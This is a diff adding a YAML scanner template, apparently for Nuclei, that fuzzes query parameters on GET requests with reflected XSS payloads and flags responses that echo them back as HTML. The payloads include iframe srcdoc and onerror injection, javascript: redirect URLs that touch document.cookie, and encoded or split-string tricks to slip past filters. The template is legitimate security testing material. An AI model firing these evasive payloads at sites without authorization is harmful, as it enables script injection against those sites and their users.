@@ -1,0 +1,39 @@
+id: reflected-xss4
+
+info:
+  name: Reflected Cross Site Scripting
+  author: github.com/freelancermijan
+  severity: medium
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'
+        - "/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)"
+        - "login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain"
+        - "<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
